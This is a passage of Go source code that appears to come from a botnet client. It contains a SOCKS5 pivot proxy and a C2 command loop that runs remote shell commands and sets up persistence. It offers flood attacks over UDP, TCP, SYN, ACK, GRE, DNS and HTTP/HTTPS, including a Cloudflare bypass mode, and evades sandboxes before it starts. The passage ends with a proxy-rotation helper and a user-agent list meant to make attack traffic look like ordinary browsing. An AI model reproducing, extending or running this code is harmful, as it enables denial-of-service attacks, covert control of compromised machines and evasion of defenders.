// Implements a SOCKS5 proxy server for pivoting/tunneling through the bot.
// ============================================================================

// muddywater starts a SOCKS5 proxy server on the specified port.
// Limits concurrent connections to lazarusMax (100) to prevent resource exhaustion.
// Parameters:
//   - port: TCP port to bind the SOCKS5 proxy to
//   - c2Conn: C2 connection (unused, kept for interface consistency)
//
// Returns: error if proxy already running or port binding fails
func muddywater(port string, c2Conn net.Conn) error {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusActive {
		return fmt.Errorf("SOCKS proxy already running")
	}
	portNum, err := strconv.Atoi(port)
	if err != nil || portNum < 1 || portNum > 65535 {
		return fmt.Errorf("invalid port: %s", port)
	}
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return fmt.Errorf("failed to bind: %v", err)
	}
	lazarusListener = listener
	lazarusActive = true
	atomic.StoreInt32(&lazarusCount, 0)
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				lazarusMutex.Lock()
				running := lazarusActive
				lazarusMutex.Unlock()
				if running {
					continue
				}
				return
			}
			if atomic.LoadInt32(&lazarusCount) >= lazarusMax {
				conn.Close()
				continue
			}
			atomic.AddInt32(&lazarusCount, 1)
			go func(c net.Conn) {
				defer atomic.AddInt32(&lazarusCount, -1)
				trickbot(c)
			}(conn)
		}
	}()
	return nil
}

// emotet stops the running SOCKS5 proxy server.
// Closes the listener and marks proxy as inactive.
func emotet() {
	lazarusMutex.Lock()
	defer lazarusMutex.Unlock()
	if lazarusListener != nil {
		lazarusListener.Close()
		lazarusListener = nil
	}
	lazarusActive = false
}

// trickbot handles a single SOCKS5 client connection.
// Implements SOCKS5 protocol: version negotiation -> connection request -> relay.
// Supports address types: IPv4 (0x01), domain (0x03), IPv6 (0x04)
// Parameters:
//   - clientConn: Incoming SOCKS5 client connection
func trickbot(clientConn net.Conn) {
	defer clientConn.Close()
	clientConn.SetDeadline(time.Now().Add(30 * time.Second))
	buf := make([]byte, 262)
	n, err := clientConn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}
	clientConn.Write([]byte{0x05, 0x00})
	n, err = clientConn.Read(buf)
	if err != nil || n < 7 || buf[1] != 0x01 {
		clientConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	addrType := buf[3]
	var targetAddr string
	var targetPort uint16
	switch addrType {
	case 0x01:
		if n < 10 {
			return
		}
		targetAddr = net.IP(buf[4:8]).String()
		targetPort = uint16(buf[8])<<8 | uint16(buf[9])
	case 0x03:
		domainLen := int(buf[4])
		if n < 5+domainLen+2 {
			return
		}
		targetAddr = string(buf[5 : 5+domainLen])
		targetPort = uint16(buf[5+domainLen])<<8 | uint16(buf[6+domainLen])
	case 0x04:
		if n < 22 {
			return
		}
		targetAddr = net.IP(buf[4:20]).String()
		targetPort = uint16(buf[20])<<8 | uint16(buf[21])
	default:
		clientConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	target := fmt.Sprintf("%s:%d", targetAddr, targetPort)
	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		clientConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
		return
	}
	defer targetConn.Close()
	localAddr := targetConn.LocalAddr().(*net.TCPAddr)
	ip4 := localAddr.IP.To4()
	if ip4 == nil {
		ip4 = net.IPv4(0, 0, 0, 0)
	}
	response := []byte{0x05, 0x00, 0x00, 0x01}
	response = append(response, ip4...)
	response = append(response, byte(localAddr.Port>>8), byte(localAddr.Port))
	clientConn.Write(response)
	clientConn.SetDeadline(time.Time{})
	targetConn.SetDeadline(time.Time{})
	done := make(chan struct{}, 2)
	go func() {
		io.Copy(targetConn, clientConn)
		if tc, ok := targetConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	go func() {
		io.Copy(clientConn, targetConn)
		if tc, ok := clientConn.(*net.TCPConn); ok {
			tc.CloseWrite()
		}
		done <- struct{}{}
	}()
	<-done
	<-done
}

// ============================================================================
// ATTACK CONTROL FUNCTIONS
// ============================================================================

// pikachu stops all running attacks by closing the stop channel.
// Creates a new stop channel for future attacks.
// Thread-safe using aptStopMutex.
func pikachu() {
	aptStopMutex.Lock()
	defer aptStopMutex.Unlock()
	if aptAttackRunning {
		close(aptStopChan)
		aptStopChan = make(chan struct{})
		aptAttackRunning = false
	}
}

// raichu returns the current stop channel and marks an attack as running.
// All attack goroutines should select on this channel to enable graceful termination.
// Returns: Channel that will be closed when attack should stop
func raichu() chan struct{} {
	aptStopMutex.Lock()
	defer aptStopMutex.Unlock()
	aptAttackRunning = true
	return aptStopChan
}

// blackEnergy is the main command dispatcher that handles all C2 commands.
// Supported commands:
//   - !shell, !exec: Execute command and return output
//   - !stream: Execute command with streaming output
//   - !detach, !bg: Execute command in background
//   - !stop: Stop all running attacks
//   - !udpflood, !tcpflood, !http, !https, !tls, !syn, !ack, !gre, !dns, !cfbypass: DDoS attacks
//   - !persist: Setup persistence mechanisms
//   - !kill: Terminate the bot
//   - !info: Return system information
//   - !socks: Start SOCKS5 proxy
//   - !stopsocks: Stop SOCKS5 proxy
//
// Parameters:
//   - conn: C2 connection for sending responses
//   - command: Raw command string from C2
//
// Returns: error if command invalid or execution fails
func blackEnergy(conn net.Conn, command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return fmt.Errorf("empty command")
	}
	cmd := fields[0]
	switch cmd {
	case "!shell", "!exec":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !shell <command>")
		}
		output, err := sidewinder(strings.Join(fields[1:], " "))
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		} else {
			encoded := base64.StdEncoding.EncodeToString([]byte(output))
			conn.Write([]byte(fmt.Sprintf("OUTPUT_B64: %s\n", encoded)))
		}
		return nil
	case "!stream":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !stream <command>")
		}
		go machete(strings.Join(fields[1:], " "), conn)
		conn.Write([]byte("Streaming started\n"))
		return nil
	case "!detach", "!bg":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !detach <command>")
		}
		oceanLotus(strings.Join(fields[1:], " "))
		conn.Write([]byte("Command running in background\n"))
		return nil
	case "!stop":
		pikachu()
		return nil
	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass":
		// Check for proxy mode: !method target port duration -pl proxy1,proxy2,...
		useProxy := false
		minFields := 4

		// Check if -pl flag is present (pre-validated proxy list from CNC)
		if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass") && len(fields) >= 6 {
			if fields[4] == "-pl" {
				useProxy = true
				// Parse comma-separated proxy list
				proxies := strings.Split(fields[5], ",")
				if len(proxies) == 0 {
					conn.Write([]byte("ERROR: Empty proxy list received\n"))
					return nil
				}
				// Update global proxy list with pre-validated proxies
				proxyListMutex.Lock()
				proxyList = proxies
				proxyListMutex.Unlock()
			}
		}

		if len(fields) < minFields {
			return fmt.Errorf("invalid format")
		}
		target := fields[1]
		targetPort, _ := strconv.Atoi(fields[2])
		duration, _ := strconv.Atoi(fields[3])
		switch cmd {
		case "!udpflood":
			go snorlax(target, targetPort, duration)
		case "!tcpflood":
			go gengar(target, targetPort, duration)
		case "!http":
			if useProxy {
				go alakazamProxy(target, targetPort, duration, true)
				return nil
			}
			go alakazam(target, targetPort, duration)
		case "!https", "!tls":
			if useProxy {
				go machampProxy(target, targetPort, duration, true)
				return nil
			}
			go machamp(target, targetPort, duration)
		case "!cfbypass":
			if useProxy {
				go gyaradosProxy(target, targetPort, duration, true)
				return nil
			}
			go gyarados(target, targetPort, duration)
		case "!syn":
			go dragonite(target, targetPort, duration)
		case "!ack":
			go tyranitar(target, targetPort, duration)
		case "!gre":
			go metagross(target, duration)
		case "!dns":
			go salamence(target, targetPort, duration)
		}
	case "!persist":
		go dragonfly()
		conn.Write([]byte("Persistence setup initiated\n"))
	case "!kill":
		conn.Write([]byte("Bot shutting down\n"))
		os.Exit(0)
	case "!info":
		hostname, _ := os.Hostname()
		arch := charmingKitten()
		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
		conn.Write([]byte(fmt.Sprintf("INFO: %s\n", info)))
	case "!socks":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !socks <port>")
		}
		err := muddywater(fields[1], conn)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("SOCKS ERROR: %v\n", err)))
		} else {
			conn.Write([]byte(fmt.Sprintf("SOCKS: Proxy started on port %s\n", fields[1])))
		}
	case "!stopsocks":
		emotet()
		conn.Write([]byte("SOCKS: Proxy stopped\n"))
	default:
		return fmt.Errorf("unknown command")
	}
	return nil
}

// anonymousSudan handles the entire C2 session lifecycle.
// Protocol flow:
//  1. Receive AUTH_CHALLENGE from server
//  2. Send authentication response (hafnium)
//  3. Receive AUTH_SUCCESS or disconnect
//  4. Send REGISTER with bot info (protocol, ID, arch, RAM)
//  5. Enter command loop (handle PING and commands)
//
// Parameters:
//   - conn: TLS connection to C2 server
func anonymousSudan(conn net.Conn) {
	deoxys("anonymousSudan: Starting C2 handler, remote: %s", conn.RemoteAddr())
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	deoxys("anonymousSudan: Waiting for auth challenge...")
	challengeMsg, err := reader.ReadString('\n')
	if err != nil {
		deoxys("anonymousSudan: Failed to read challenge: %v", err)
		conn.Close()
		return
	}
	challengeMsg = strings.TrimSpace(challengeMsg)
	deoxys("anonymousSudan: Received: %s", challengeMsg)
	if !strings.HasPrefix(challengeMsg, "AUTH_CHALLENGE:") {
		deoxys("anonymousSudan: Invalid challenge format, closing")
		conn.Close()
		return
	}
	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
	challenge = strings.TrimSpace(challenge)
	deoxys("anonymousSudan: Challenge extracted: %s", challenge)
	response := hafnium(challenge, magicCode)
	deoxys("anonymousSudan: Sending auth response...")
	conn.Write([]byte(response + "\n"))
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	authResult, err := reader.ReadString('\n')
	if err != nil || strings.TrimSpace(authResult) != "AUTH_SUCCESS" {
		deoxys("anonymousSudan: Auth failed: err=%v, result=%s", err, strings.TrimSpace(authResult))
		conn.Close()
		return
	}
	deoxys("anonymousSudan: Authentication successful!")
	botID := mustangPanda()
	arch := charmingKitten()
	ram := revilMem()
	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB", botID, arch, ram)
	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d\n", protocolVersion, botID, arch, ram)))
	deoxys("anonymousSudan: Entering command loop...")
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		command, err := reader.ReadString('\n')
		if err != nil {
			deoxys("anonymousSudan: Command read error: %v", err)
			break
		}
		command = strings.TrimSpace(command)
		deoxys("anonymousSudan: Received command: %s", command)
		if command == "PING" {
			deoxys("anonymousSudan: Responding to PING")
			conn.Write([]byte("PONG\n"))
			continue
		}
		deoxys("anonymousSudan: Executing command via blackEnergy...")
		if err := blackEnergy(conn, command); err != nil {
			deoxys("anonymousSudan: Command error: %v", err)
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		}
	}
	deoxys("anonymousSudan: Connection closed")
	conn.Close()
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

// main is the bot's entry point that orchestrates startup and C2 connection.
// Startup sequence:
//  1. Check for sandbox/analysis environment (winnti)
//  2. Setup basic persistence (fin7)
//  3. Resolve C2 address via multi-method DNS (dialga)
//  4. Enter reconnection loop with TLS connections
//
// The bot will continuously attempt to reconnect on disconnection.
func main() {
	deoxys("main: Bot starting up...")
	deoxys("main: Protocol version: %s", protocolVersion)
	if winnti() {
		deoxys("main: Sandbox detected, exiting")
		os.Exit(200)
	}
	deoxys("main: No sandbox detected, continuing")
	deoxys("main: Running persistence check (fin7 -> rc.local)...")
	fin7()
	deoxys("main: fin7 persistence check complete")
	deoxys("main: Running persistence check (lazarus -> cron)...")
	lazarus()
	deoxys("main: lazarus persistence check complete")
	deoxys("main: Resolving C2 address...")
	c2Address := dialga()
	if c2Address == "" {
		deoxys("main: Failed to resolve C2, exiting")
		return
	}
	deoxys("main: C2 resolved to: %s", c2Address)
	host, port, err := scarcruft(c2Address)
	if err != nil {
		deoxys("main: Failed to parse C2 address: %v", err)
		return
	}
	deoxys("main: C2 Host: %s, Port: %s", host, port)
	deoxys("main: Entering main connection loop...")
	for {
		deoxys("main: Attempting connection to C2...")
		conn, err := gamaredon(host, port)
		if err != nil {
			deoxys("main: Connection failed: %v, retrying in %v", err, fancyBear)
			time.Sleep(fancyBear)
			continue
		}
		deoxys("main: Connected to C2, starting handler")
		anonymousSudan(conn)
		deoxys("main: Handler returned, reconnecting in %v", fancyBear)
		time.Sleep(fancyBear)
	}
}

// ============================================================================
// PROXY SUPPORT FUNCTIONS
// These enable L7 attacks through HTTP/HTTPS proxies for IP rotation.
// Proxy lists are pre-validated by CNC and sent directly to bots.
// ============================================================================

// persian returns a random proxy from the global proxy list.
// Thread-safe using RWMutex for concurrent access during attacks.
// Returns: Random proxy URL string, or empty string if no proxies loaded
func persian() string {
	proxyListMutex.RLock()
	defer proxyListMutex.RUnlock()
	if len(proxyList) == 0 {
		return ""
	}
	return proxyList[rand.Intn(len(proxyList))]
}

// meowstic creates an HTTP client configured to use a proxy.
// Supports HTTP/HTTPS proxies with optional authentication.
// Parameters:
//   - proxyAddr: Proxy URL (http://ip:port or http://user:pass@ip:port)
//   - timeout: Request timeout duration
//
// Returns: Configured HTTP client or error
func meowstic(proxyAddr string, timeout time.Duration) (*http.Client, error) {
	proxyURL, err := url.Parse(proxyAddr)
	if err != nil {
		return nil, err
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
		DisableKeepAlives:     false,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		ResponseHeaderTimeout: timeout,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}, nil
}

// magikarp is a struct for parsing DNS-over-HTTPS JSON responses.
// Used by lucario for domain resolution via DoH when system DNS fails.
type magikarp struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

// lucario resolves a target hostname to an IP address.
// Resolution order: direct IP passthrough -> Cloudflare DoH -> system DNS
// DoH is prioritized to bypass local DNS filtering/monitoring.
// Parameters:
//   - target: IP address or hostname (may include http:// prefix or port)
//
// Returns: Resolved IP address string or error
func lucario(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}
	if idx := strings.Index(target, ":"); idx != -1 {
		target = target[:idx]
	}
	// Try Cloudflare DoH first (bypasses local DNS filtering)
	dohServers := []string{
		"https://1.1.1.1/dns-query",
		"https://cloudflare-dns.com/dns-query",
	}
	for _, server := range dohServers {
		url := fmt.Sprintf("%s?name=%s&type=A", server, target)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Accept", "application/dns-json")
		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}
		var dnsResp magikarp
		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
			resp.Body.Close()
			continue
		}
		resp.Body.Close()
		if len(dnsResp.Answer) > 0 {
			return dnsResp.Answer[0].Data, nil
		}
	}
	// Fallback to system DNS resolver
	ips, err := net.LookupHost(target)
	if err == nil && len(ips) > 0 {
		return ips[0], nil
	}
	return "", fmt.Errorf("all resolution methods failed for: %s", target)
}

// eevee is a comprehensive list of real-world browser User-Agent strings.
// Used to make attack requests appear as legitimate browser traffic.
// Includes: Chrome, Firefox, Safari, Edge for Windows/macOS/Linux/Mobile
// Updated: February 2026 with latest browser versions
var eevee = []string{
	// ======================== CHROME 2025-2026 ========================
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
	// ======================== FIREFOX 2025-2026 ========================
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0",
	// ======================== EDGE 2025-2026 ========================
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
	// ======================== SAFARI 2025-2026 ========================
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
	// ======================== MOBILE - iOS 2025-2026 ========================
	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
	// ======================== MOBILE - Android 2025-2026 ========================
	"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 15; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 15; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
	// ======================== WINDOWS 11 SPECIFIC ========================
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/117.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Vivaldi/7.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Brave/131",
	// ======================== OLDER BUT COMMON (2024) ========================
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
	"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
	"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
